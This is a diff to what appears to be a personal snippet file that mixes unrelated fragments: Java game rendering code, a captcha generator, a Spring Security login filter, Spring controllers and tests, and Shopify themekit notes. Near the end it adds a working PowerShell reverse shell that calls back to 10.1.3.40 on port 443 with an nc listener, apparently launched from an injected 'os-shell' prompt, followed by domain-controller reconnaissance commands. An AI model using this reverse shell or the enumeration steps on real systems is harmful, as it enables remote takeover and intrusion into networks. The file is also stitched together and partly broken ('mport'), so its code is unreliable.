@@ -9705,6 +9705,641 @@ shopify-themekit <args>
 https://github.com/Shopify/node-themekit
 https://shopify.github.io/themekit/commands/
 ----------------------------------------------------------------------------------------
+import java.awt.Color;
+import java.awt.Graphics;
+
+import util.Renderable;
+
+/**
+ * A class used to define the constraints of the in-game world and how to render it to the canvas.
+ * @author nicholasadamou
+ *
+ */
+public class World implements Renderable
+{
+	public static final int TILE_WIDTH = 15;
+	public static final int TILE_HEIGHT = 15;
+	public static final int WORLD_WIDTH = 25;
+	public static final int WORLD_HEIGHT = 25;
+
+	
+	@Override
+	public void render(Graphics g)
+	{
+		g.setColor(Color.white);
+
+		g.drawRect(0, 0, WORLD_WIDTH * TILE_WIDTH, WORLD_HEIGHT * TILE_HEIGHT);
+
+		for (int x = TILE_WIDTH; x < WORLD_WIDTH * TILE_WIDTH; x += TILE_WIDTH)
+			g.drawLine(x, 0, x, WORLD_WIDTH * TILE_WIDTH);
+		for (int y = TILE_HEIGHT; y < WORLD_HEIGHT * TILE_HEIGHT; y += TILE_HEIGHT)
+			g.drawLine(0, y, WORLD_HEIGHT * TILE_HEIGHT, y);
+	}
+}
+import java.awt.Color;
+import java.awt.Font;
+import java.awt.Graphics;
+import java.awt.font.FontRenderContext;
+import java.awt.geom.AffineTransform;
+
+public class Util
+{
+	/**
+	 * Prints a message to the console.
+	 * 
+	 * @param msg The message to print to the console.
+	 */
+	public static void printMessage(String msg)
+	{
+		System.out.println(msg);
+	}
+
+	/**
+	 * Draws a standard message to the canvas at a specific x-coordinate and y-coordinate that is not Off set by a certain value.
+	 * 
+	 * @param g The Graphics class use to draw to the canvas.
+	 * @param textColor The color of the text on the canvas.
+	 * @param msg The text to be displayed on the canvas.
+	 * @param fontFamily The font family of the text.
+	 * @param fontSize The size of the font to be drawn to the canvas.
+	 * @param x The x-coordinate on the canvas.
+	 * @param y The y-coordinate on the canvas.
+	 */
+	public static void simpleMessage(Graphics g, Color textColor, String msg, String fontFamily, int fontSize, int x,
+			int y)
+	{
+		g.setColor(textColor);
+		g.setFont(new Font(fontFamily, Font.PLAIN, fontSize));
+		g.drawString(msg, x, y);
+	}
+
+	/**
+	 * Draws a message to the canvas at a specific x-coordinate and y-coordinate that is not Off set by a certain value.
+	 * 
+	 * @param g The Graphics class use to draw to the canvas.
+	 * @param textColor The color of the text on the canvas.
+	 * @param msg The text to be displayed on the canvas.
+	 * @param fontFamily The font family of the text.
+	 * @param fontSize The size of the font to be drawn to the canvas.
+	 * @param x The x-coordinate on the canvas.
+	 * @param textOffset The offset in the x-plane
+	 * @param y The y-coordinate on the canvas.
+	 */
+	public static void complexMessage(Graphics g, Color textColor, String msg, String fontFamily, int fontSize, int x,
+			int textOffset, int y)
+	{
+		int textWidth = (int) (new Font(fontFamily, Font.PLAIN, fontSize)
+				.getStringBounds(msg, new FontRenderContext(new AffineTransform(), true, true)).getWidth());
+
+		g.setColor(textColor);
+		g.drawString(msg, x - textWidth - textOffset, y);
+	}
+
+	/**
+	 * Calculates the width of a string of text in respect to its font metrics.
+	 * @param msg The message to calculate the width of.
+	 * @return The width of the screen.
+	 */
+	public static int getWidthOfString(String msg)
+	{
+		AffineTransform affinetransform = new AffineTransform();
+		FontRenderContext frc = new FontRenderContext(affinetransform, true, true);
+		Font font = new Font("Tahoma", Font.PLAIN, 12);
+
+		return (int) (font.getStringBounds(msg, frc).getWidth());
+
+	}
+
+	/**
+	 * Calculates the height of a string of text in respect to its font metrics.
+	 * @param msg The message to calculate the height of.
+	 * @return The height of the screen.
+	 */
+	public static int getHeightOfString(String msg)
+	{
+		AffineTransform affinetransform = new AffineTransform();
+		FontRenderContext frc = new FontRenderContext(affinetransform, true, true);
+		Font font = new Font("Tahoma", Font.PLAIN, 12);
+
+		return (int) (font.getStringBounds(msg, frc).getHeight());
+	}
+}
+----------------------------------------------------------------------------------------
+  @ExceptionHandler({OptionalNotPresentException.class})
+    @ResponseStatus(HttpStatus.NOT_FOUND)
+    public ModelAndView handlerUnauthenticatedException(Exception ex, NativeWebRequest request) {
+        if ((request.getHeader("accept").contains("application/json"))) {
+            MappingJackson2JsonView view = new MappingJackson2JsonView();
+            Map<String, Serializable> attributes = new HashMap<>();
+            attributes.put("error", HttpStatus.NOT_FOUND);
+            view.setAttributesMap(attributes);
+            return new ModelAndView(view);
+        } else {
+            return new ModelAndView("/404");
+        }
+    }
+----------------------------------------------------------------------------------------
+import com.github.izhangzhihao.SSMSeedProject.Utils.SHAUtils;
+import lombok.extern.slf4j.Slf4j;
+import org.jetbrains.annotations.NotNull;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.security.authentication.AuthenticationManager;
+import org.springframework.security.authentication.AuthenticationServiceException;
+import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
+import org.springframework.security.core.Authentication;
+import org.springframework.security.core.AuthenticationException;
+import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
+import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+@Slf4j
+//@Component
+public class AuthenticationFilter extends UsernamePasswordAuthenticationFilter {
+
+    @Autowired
+    @Override
+    public void setAuthenticationManager(AuthenticationManager authenticationManager) {
+        super.setAuthenticationManager(authenticationManager);
+    }
+
+    @Override
+    protected String obtainPassword(HttpServletRequest request) {
+        return SHAUtils.getSHA_256(request.getParameter("Password"));
+    }
+
+    @Override
+    protected String obtainUsername(HttpServletRequest request) {
+        return request.getParameter("UserName");
+    }
+
+    @NotNull
+    private String obtainValidateCode(HttpServletRequest request) {
+        return request.getParameter("validateCode");
+    }
+
+    public AuthenticationFilter() {
+        super();
+        setRequiresAuthenticationRequestMatcher(new AntPathRequestMatcher("/login", "POST"));
+    }
+
+    @Override
+    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
+        if (!request.getMethod().equals("POST")) {
+            throw new AuthenticationServiceException(
+                    "Authentication method not supported: " + request.getMethod());
+        }
+        String userValidateCode = obtainValidateCode(request);
+        String serverValidateCode = request.getSession().getAttribute("validateCode").toString();
+
+        if (!userValidateCode.equalsIgnoreCase(serverValidateCode)) {
+            throw new ValidateCodeNotMatchException("validate code not match");
+        }
+
+        String username = obtainUsername(request);
+        String password = obtainPassword(request);
+
+        if (username == null) {
+            username = "";
+        }
+
+        if (password == null) {
+            password = "";
+        }
+
+        username = username.trim();
+
+        UsernamePasswordAuthenticationToken authRequest = new UsernamePasswordAuthenticationToken(username, password);
+
+        // Allow subclasses to set the "details" property
+        setDetails(request, authRequest);
+
+//        log.warn(getAuthenticationManager().toString());
+//
+//        Authentication authenticate = getAuthenticationManager()
+//                .authenticate(
+//                        authRequest);
+
+        return authRequest;
+    }
+}
+----------------------------------------------------------------------------------------
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.util.Random;
+
+/**
+ * 验证码生成器类，可生成数字、大写、小写字母及三者混合类型的验证码。 支持自定义验证码字符数量； 支持自定义验证码图片的大小； 支持自定义需排除的特殊字符；
+ * 支持自定义干扰线的数量； 支持自定义验证码图文颜色
+ */
+@SuppressWarnings("WeakerAccess")
+public class ValidateCode {
+
+    /**
+     * 验证码类型为仅数字 0~9
+     */
+    public static final int TYPE_NUM_ONLY = 0;
+
+    /**
+     * 验证码类型为仅字母，即大写、小写字母混合
+     */
+    public static final int TYPE_LETTER_ONLY = 1;
+
+    /**
+     * 验证码类型为数字、大写字母、小写字母混合
+     */
+    public static final int TYPE_ALL_MIXED = 2;
+
+    /**
+     * 验证码类型为数字、大写字母混合
+     */
+    public static final int TYPE_NUM_UPPER = 3;
+
+    /**
+     * 验证码类型为数字、小写字母混合
+     */
+    public static final int TYPE_NUM_LOWER = 4;
+
+    /**
+     * 验证码类型为仅大写字母
+     */
+    public static final int TYPE_UPPER_ONLY = 5;
+
+    /**
+     * 验证码类型为仅小写字母
+     */
+    public static final int TYPE_LOWER_ONLY = 6;
+
+    private ValidateCode() {
+
+    }
+
+    /**
+     * 生成验证码字符串
+     *
+     * @param type    验证码类型，参见本类的静态属性
+     * @param length  验证码长度，大于0的整数
+     * @param exChars 需排除的特殊字符（仅对数字、字母混合型验证码有效，无需排除则为null）
+     * @return 验证码字符串
+     */
+    public static String generateTextCode(int type, int length, String exChars) {
+
+        if (length <= 0)
+            return "";
+
+        StringBuilder code = new StringBuilder();
+        int i = 0;
+        Random r = new Random();
+
+        switch (type) {
+
+            // 仅数字
+            case TYPE_NUM_ONLY:
+                while (i < length) {
+                    int t = r.nextInt(10);
+                    if (exChars == null || !exChars.contains(t + "")) {// 排除特殊字符
+                        code.append(t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 仅字母（即大写字母、小写字母混合）
+            case TYPE_LETTER_ONLY:
+                while (i < length) {
+                    int t = r.nextInt(123);
+                    if ((t >= 97 || (t >= 65 && t <= 90)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 数字、大写字母、小写字母混合
+            case TYPE_ALL_MIXED:
+                while (i < length) {
+                    int t = r.nextInt(123);
+                    if ((t >= 97 || (t >= 65 && t <= 90) || (t >= 48 && t <= 57))
+                            && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 数字、大写字母混合
+            case TYPE_NUM_UPPER:
+                while (i < length) {
+                    int t = r.nextInt(91);
+                    if ((t >= 65 || (t >= 48 && t <= 57)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 数字、小写字母混合
+            case TYPE_NUM_LOWER:
+                while (i < length) {
+                    int t = r.nextInt(123);
+                    if ((t >= 97 || (t >= 48 && t <= 57)) && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 仅大写字母
+            case TYPE_UPPER_ONLY:
+                while (i < length) {
+                    int t = r.nextInt(91);
+                    if ((t >= 65) && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+            // 仅小写字母
+            case TYPE_LOWER_ONLY:
+                while (i < length) {
+                    int t = r.nextInt(123);
+                    if ((t >= 97) && (exChars == null || exChars.indexOf((char) t) < 0)) {
+                        code.append((char) t);
+                        i++;
+                    }
+                }
+                break;
+
+        }
+
+        return code.toString();
+    }
+
+    /**
+     * 已有验证码，生成验证码图片
+     *
+     * @param textCode       文本验证码
+     * @param width          图片宽度
+     * @param height         图片高度
+     * @param interLine      图片中干扰线的条数
+     * @param randomLocation 每个字符的高低位置是否随机
+     * @param backColor      图片颜色，若为null，则采用随机颜色
+     * @param foreColor      字体颜色，若为null，则采用随机颜色
+     * @param lineColor      干扰线颜色，若为null，则采用随机颜色
+     * @return 图片缓存对象
+     */
+    public static BufferedImage generateImageCode(String textCode, int width, int height, int interLine,
+                                                  boolean randomLocation, Color backColor, Color foreColor, Color lineColor) {
+
+        BufferedImage bim = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
+        Graphics g = bim.getGraphics();
+
+        // 画背景图
+        g.setColor(backColor == null ? getRandomColor() : backColor);
+        g.fillRect(0, 0, width, height);
+
+        // 画干扰线
+        Random r = new Random();
+        if (interLine > 0) {
+
+            int x = 0, y = 0, x1 = width, y1 = 0;
+            for (int i = 0; i < interLine; i++) {
+                g.setColor(lineColor == null ? getRandomColor() : lineColor);
+                y = r.nextInt(height);
+                y1 = r.nextInt(height);
+
+                g.drawLine(x, y, x1, y1);
+            }
+        }
+
+        // 写验证码
+
+        // g.setColor(getRandomColor());
+        // g.setColor(isSimpleColor?Color.BLACK:Color.WHITE);
+
+        // 字体大小为图片高度的80%
+        int fontSize = (int) (height * 0.8);
+        int fx = height - fontSize;
+        int fy = fontSize;
+
+        g.setFont(new Font("Default", Font.PLAIN, fontSize));
+
+        // 写验证码字符
+        for (int i = 0; i < textCode.length(); i++) {
+            fy = randomLocation ? (int) ((Math.random() * 0.3 + 0.6) * height) : fy;// 每个字符高低是否随机
+            g.setColor(foreColor == null ? getRandomColor() : foreColor);
+            g.drawString(textCode.charAt(i) + "", fx, fy);
+            fx += fontSize * 0.9;
+        }
+
+        g.dispose();
+
+        return bim;
+    }
+
+    /**
+     * 生成图片验证码
+     *
+     * @param type           验证码类型，参见本类的静态属性
+     * @param length         验证码字符长度，大于0的整数
+     * @param exChars        需排除的特殊字符
+     * @param width          图片宽度
+     * @param height         图片高度
+     * @param interLine      图片中干扰线的条数
+     * @param randomLocation 每个字符的高低位置是否随机
+     * @param backColor      图片颜色，若为null，则采用随机颜色
+     * @param foreColor      字体颜色，若为null，则采用随机颜色
+     * @param lineColor      干扰线颜色，若为null，则采用随机颜色
+     * @return 图片缓存对象
+     */
+    public static BufferedImage generateImageCode(int type, int length, String exChars, int width, int height,
+                                                  int interLine, boolean randomLocation, Color backColor, Color foreColor, Color lineColor) {
+
+        String textCode = generateTextCode(type, length, exChars);
+
+        return generateImageCode(textCode, width, height, interLine, randomLocation, backColor, foreColor,
+                lineColor);
+    }
+
+    /**
+     * 产生随机颜色
+     *
+     * @return 颜色
+     */
+    private static Color getRandomColor() {
+        Random r = new Random();
+        return new Color(r.nextInt(255), r.nextInt(255), r.nextInt(255));
+    }
+
+}
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+import demo.model.primary.PrimaryModel;
+import demo.repository.primary.PrimaryRepository;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.data.domain.Example;
+import org.springframework.data.domain.ExampleMatcher;
+import org.springframework.data.domain.Pageable;
+import org.springframework.data.rest.webmvc.RepositoryRestController;
+import org.springframework.data.web.PagedResourcesAssembler;
+import org.springframework.hateoas.PagedResources;
+import org.springframework.hateoas.Resource;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+
+import static org.springframework.data.domain.ExampleMatcher.StringMatcher.CONTAINING;
+
+@RestController
+@RequestMapping("/${spring.data.rest.base-path}/primary")
+@RepositoryRestController
+public class PrimaryRestController {
+
+	@Autowired
+	private PrimaryRepository primaryRepository;
+
+	@Autowired
+	private PagedResourcesAssembler<PrimaryModel> pagedAssembler;
+
+	@GetMapping
+	public PagedResources<Resource<PrimaryModel>> getPrimary(Pageable pageable, PrimaryModel primaryModel) {
+		ExampleMatcher exampleMatcher = ExampleMatcher.matching()
+				.withMatcher("name", matcher -> matcher.stringMatcher(CONTAINING))
+				.withIgnoreCase()
+				.withIgnoreNullValues();
+		Example<PrimaryModel> example = Example.of(primaryModel, exampleMatcher);
+		return pagedAssembler.toResource(primaryRepository.findAll(example, pageable));
+	}
+}
+
+	@PostMapping
+	public String saveSecondary(@ModelAttribute @Valid SecondaryForm form, BindingResult result,
+			RedirectAttributes redirectAttrs, Model model) {
+		if (result.hasErrors()) {
+			return "secondary";
+		}
+		SecondaryModel newSecondaryModel = repository.save(new SecondaryModelBuilder()
+				.fromForm(form)
+				.build());
+		redirectAttrs.addFlashAttribute("success", newSecondaryModel);
+		return "redirect:/secondary";
+	}
+	
+mport demo.model.secondary.SecondaryModel;
+import demo.repository.secondary.SecondaryRepository;
+import org.hibernate.validator.HibernateValidator;
+import org.junit.Before;
+import org.junit.Test;
+import org.junit.runner.RunWith;
+import org.mockito.Mock;
+import org.mockito.runners.MockitoJUnitRunner;
+import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;
+import org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;
+import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;
+
+import javax.validation.ConstraintViolation;
+import java.util.Set;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.mockito.Matchers.eq;
+import static org.mockito.Mockito.when;
+
+@RunWith(MockitoJUnitRunner.class)
+public class UniqueSecondaryTest {
+
+	private LocalValidatorFactoryBean validator = new LocalValidatorFactoryBean();
+
+	@Mock
+	private SecondaryRepository secondaryRepository;
+
+	@Before
+	public void before() {
+		AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();
+		context.refresh();
+
+		ConfigurableListableBeanFactory beanFactory = context.getBeanFactory();
+		beanFactory.registerSingleton(SecondaryRepository.class.getCanonicalName(), secondaryRepository);
+
+		validator.setApplicationContext(context);
+		validator.setProviderClass(HibernateValidator.class);
+		validator.afterPropertiesSet();
+	}
+
+	@Test
+	public void uniqueSecondaryModel() {
+		SecondaryForm form = new SecondaryForm();
+		form.setName("Test");
+
+		when(secondaryRepository.findByNameIgnoreCase(eq(form.getName()))).thenReturn(null);
+
+		Set<ConstraintViolation<SecondaryForm>> constraintViolations = validator.validate(form);
+		assertThat(constraintViolations).isEmpty();
+	}
+
+	@Test
+	public void nonUniqueSecondaryModel() {
+		SecondaryForm form = new SecondaryForm();
+		form.setName("Test");
+
+		when(secondaryRepository.findByNameIgnoreCase(eq(form.getName()))).thenReturn(new SecondaryModel());
+
+		Set<ConstraintViolation<SecondaryForm>> constraintViolations = validator.validate(form);
+		assertThat(constraintViolations).hasSize(1);
+	}
+
+}
+
+import org.junit.Test;
+import org.junit.runner.RunWith;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
+import org.springframework.test.context.junit4.SpringRunner;
+import org.springframework.test.web.servlet.MockMvc;
+
+import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.model;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
+import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.view;
+
+@RunWith(SpringRunner.class)
+@WebMvcTest(DemoController.class)
+public class DemoControllerTest {
+
+	@Autowired
+	private MockMvc mockMvc;
+	
+	@Test
+	public void getHome() throws Exception {
+		mockMvc.perform(get("/"))
+				.andExpect(status().isOk())
+				.andExpect(model().attributeExists("sbVersion"))
+				.andExpect(view().name("home"));
+	}
+
+}
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------
 echo kern.maxfiles=65536 | sudo tee -a /etc/sysctl.conf
 echo kern.maxfilesperproc=65536 | sudo tee -a /etc/sysctl.conf
 sudo sysctl -w kern.maxfiles=65536
@@ -9720,6 +10355,28 @@ https://business.tutsplus.com/articles/best-shopify-themes--cms-30306
 ----------------------------------------------------------------------------------------
 go get -u github.com/Shopify/themekit
 ----------------------------------------------------------------------------------------
+nc -lp 443
+
+$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (IEX $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush()};
+$client.Close()"
+
+os-shell> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+echo (Get-WmiObject Win32_ComputerSystem).Name
+server2012
+
+echo $env:userdomain
+mydomain
+
+cmd /c "nltest /dclist:mydomain"
 ----------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------
